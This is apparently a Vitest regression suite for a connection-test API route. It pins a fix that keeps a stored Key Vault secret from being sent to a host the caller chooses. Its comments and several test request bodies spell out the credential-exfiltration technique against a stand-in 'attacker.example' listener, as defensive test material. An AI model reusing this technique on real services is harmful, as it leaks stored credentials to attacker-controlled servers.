/**
 * POST /api/connections/test — the credential and the destination of a probe
 * must come from the SAME origin.
 *
 * THE DEFECT THESE TESTS PIN
 *   The route took the SECRET from a stored connection (`body.id` → its Key Vault
 *   `secretRef`) and the DESTINATION from the request (`body.host`), plus
 *   `body.type` / `body.authMethod` / `body.username`. A caller could therefore
 *   name any connection it owned, leave the secret field blank, and have the
 *   Console resolve that Key Vault secret with its managed identity and present
 *   it — as a TDS password, a full connection string, or an account key — to a
 *   server the caller controls. `authMethod: 'connection-string'` is the worst
 *   case: the entire connection string is handed to the caller's TDS listener.
 *
 * Hermetic: session, the connections store, and Key Vault are mocked, and
 * `probeConnection` is captured so every assertion is on the coordinates the
 * probe was ACTUALLY asked to connect to.
 */
import { describe, it, expect, beforeEach, vi } from 'vitest';

vi.mock('@/lib/auth/session', () => ({
  getSession: () => ({ claims: { oid: 'owner-1', tid: 't1', groups: [] }, exp: Date.now() / 1000 + 3600 }),
}));

const kvRead = vi.fn(async () => 'STORED-CONNECTION-STRING');
vi.mock('@/lib/azure/kv-secrets-client', () => ({
  getKeyVaultSecretValue: (...a: any[]) => kvRead(...(a as [])),
}));

const loadConnectionMock = vi.fn();
vi.mock('@/lib/azure/connections-store', async (orig) => {
  const actual = (await orig()) as any;
  return { ...actual, loadConnection: (...a: any[]) => loadConnectionMock(...a) };
});

const probeMock = vi.fn(async () => ({ ok: true as const, reachable: true, detail: 'reached' }));
vi.mock('@/lib/azure/connection-probe', () => ({
  probeConnection: (...a: any[]) => probeMock(...(a as [])),
}));

import { POST } from '../route';

const req = (body: any) => ({ json: async () => body }) as any;
const probedWith = () => probeMock.mock.calls[0]?.[0] as any;

/** A saved connection whose secret is a full Azure SQL connection string. */
const SAVED = {
  id: 'conn-1',
  name: 'Prod finance SQL',
  type: 'azure-sql',
  authMethod: 'connection-string',
  host: 'prod-finance.database.windows.net',
  database: 'finance',
  username: 'svc_reader',
  secretRef: 'loom-conn-conn-1',
};

beforeEach(() => {
  vi.clearAllMocks();
  loadConnectionMock.mockResolvedValue(SAVED);
});

describe('ATTACK: stored credential, caller-chosen destination', () => {
  it('never presents a stored Key Vault secret to a caller-supplied host', async () => {
    const res = await POST(req({
      id: 'conn-1',
      type: 'azure-sql',
      authMethod: 'connection-string',
      host: 'attacker.example',      // <- the caller's own TDS listener
      database: 'anything',
    }));

    expect(res.status).toBe(200);
    expect(probeMock).toHaveBeenCalledTimes(1);
    // The probe went to the SAVED coordinates, not the requested ones.
    expect(probedWith().host).toBe(SAVED.host);
    expect(probedWith().host).not.toBe('attacker.example');
    expect(probedWith().database).toBe(SAVED.database);
    // ...and the response says so rather than silently reporting on a different host.
    expect((await res.json()).note).toMatch(/as stored/i);
  });

  it('cannot re-type a stored credential as a different auth method', async () => {
    // Re-labelling an account key / connection string as a SQL password is how a
    // secret gets forwarded through a channel that echoes it back.
    await POST(req({
      id: 'conn-1',
      type: 'postgres',
      authMethod: 'sql-password',
      host: 'attacker.example',
      username: 'attacker',
    }));
    expect(probedWith().type).toBe(SAVED.type);
    expect(probedWith().authMethod).toBe(SAVED.authMethod);
    expect(probedWith().username).toBe(SAVED.username);
    expect(probedWith().host).toBe(SAVED.host);
  });

  it('reads the stored secret under the connection-secret purpose only', async () => {
    await POST(req({ id: 'conn-1', type: 'azure-sql', authMethod: 'connection-string', host: 'attacker.example' }));
    expect(kvRead).toHaveBeenCalledWith('loom-conn-conn-1', 'connection-secret');
  });

  it('cannot borrow another user\'s connection (the store is oid-scoped)', async () => {
    loadConnectionMock.mockResolvedValue(null);
    const res = await POST(req({ id: 'someone-elses', type: 'azure-sql', authMethod: 'sql-password', host: 'attacker.example' }));
    expect(res.status).toBe(404);
    expect(probeMock).not.toHaveBeenCalled();
    expect(kvRead).not.toHaveBeenCalled();
  });
});

describe('the legitimate pre-save flow still works', () => {
  it('probes exactly what the caller typed when the caller supplies the secret', async () => {
    const res = await POST(req({
      type: 'azure-sql',
      authMethod: 'sql-password',
      host: 'new-server.database.windows.net',
      database: 'db1',
      username: 'u1',
      secret: 'typed-by-the-user',
    }));
    expect(res.status).toBe(200);
    expect(probedWith()).toMatchObject({
      type: 'azure-sql',
      authMethod: 'sql-password',
      host: 'new-server.database.windows.net',
      database: 'db1',
      username: 'u1',
      secret: 'typed-by-the-user',
    });
    // No stored secret was touched.
    expect(kvRead).not.toHaveBeenCalled();
  });

  it('a typed secret wins over the stored one even in edit mode', async () => {
    await POST(req({
      id: 'conn-1',
      type: 'azure-sql',
      authMethod: 'sql-password',
      host: 'moved-server.database.windows.net',
      username: 'u1',
      secret: 'rotated-password',
    }));
    expect(kvRead).not.toHaveBeenCalled();
    expect(probedWith().host).toBe('moved-server.database.windows.net');
    expect(probedWith().secret).toBe('rotated-password');
  });

  it('re-tests a saved connection with no edits and no note', async () => {
    const res = await POST(req({
      id: 'conn-1',
      type: SAVED.type,
      authMethod: SAVED.authMethod,
      host: SAVED.host,
      database: SAVED.database,
      username: SAVED.username,
    }));
    expect(probedWith().host).toBe(SAVED.host);
    expect(probedWith().secret).toBe('STORED-CONNECTION-STRING');
    expect((await res.json()).note).toBeUndefined();
  });

  it('entra-mi needs no secret and probes the requested host', async () => {
    await POST(req({ id: 'conn-1', type: 'azure-sql', authMethod: 'entra-mi', host: 'other.database.windows.net' }));
    expect(kvRead).not.toHaveBeenCalled();
    expect(probedWith().host).toBe('other.database.windows.net');
  });
});
